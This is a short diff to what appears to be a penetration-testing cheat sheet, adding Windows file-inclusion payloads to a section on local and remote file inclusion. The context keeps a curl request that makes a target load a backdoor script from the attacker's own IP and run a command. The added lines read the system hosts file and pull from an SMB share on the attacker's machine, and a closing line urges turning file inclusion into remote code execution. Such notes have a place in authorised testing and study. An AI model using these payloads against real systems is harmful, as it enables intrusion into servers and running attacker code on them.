@@ -217,6 +217,13 @@ python3 -m http.server
 curl "http://example.com/subdir/index.php?page=http://$YOUR_IP/simple-backdoor.php&cmd=ls"
 ```
 
+Windows:
+
+```bash
+view=C:/windows/system32/drivers/etc/hosts
+view=//$myip/test/share
+```
+
 18. File Upload Vulns (Executable)
 
 THINK ABOUT RCE WHENEVER YOU HAVE LFI.
